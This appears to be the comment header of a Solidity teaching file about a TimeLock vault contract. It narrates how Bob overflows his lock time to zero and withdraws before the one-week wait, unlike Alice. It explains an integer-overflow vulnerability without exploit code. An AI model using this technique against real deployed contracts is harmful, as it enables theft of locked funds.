// This contract is designed to act as a time vault.
// User can deposit into this contract but cannot withdraw for atleast a week.
// User can also extend the wait time beyond the 1 week waiting period.

/*
1. Alice and bob both have 1 Ether balance
2. Deploy TimeLock Contract
3. Alice and bob both deposit 1 Ether to TimeLock, they need to wait 1 week to unlock Ether
4. Bob caused an overflow on his lockTime
5, Alice can't withdraw 1 Ether, because the lock time not expired.
6. Bob can withdraw 1 Ether, because the lockTime is overflow to 0

What happened?
Attack caused the TimeLock.lockTime to overflow,
and was able to withdraw before the 1 week waiting period.
